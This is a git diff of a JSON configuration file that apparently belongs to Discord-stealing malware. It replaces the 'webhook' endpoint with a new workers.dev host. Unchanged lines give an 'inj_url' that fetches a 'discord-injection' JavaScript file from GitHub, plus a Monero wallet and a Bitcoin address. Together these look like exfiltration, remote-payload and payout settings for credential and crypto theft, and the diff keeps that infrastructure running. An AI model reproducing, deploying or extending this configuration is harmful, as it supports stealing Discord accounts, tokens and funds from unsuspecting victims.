@@ -1,5 +1,5 @@
 {
-  "webhook": "https://dusmanlarimyasamaz.pythonanywhere.com/api/bulletartisback",
+  "webhook": "https://prc-worker.kimliksizdevlet.workers.dev/api/bulletartisback",
   "inj_url": "https://raw.githubusercontent.com/Esrefpasa/discord-injection/refs/heads/main/alacati.js",
   "xmr_wallet": "472gZXJUodaV39mQxXrSgrYMGhJSydsUMAEbM7SM7mWY6bvKXq5WXbwHscDkWsxkbwCiFo2fxpCFZ1r9BCsaFMke8URVwmY",
   "btc": "bc1q6jzfzxajec9n3rqqlg6cfwa5mwepkrz2ag7x2x",
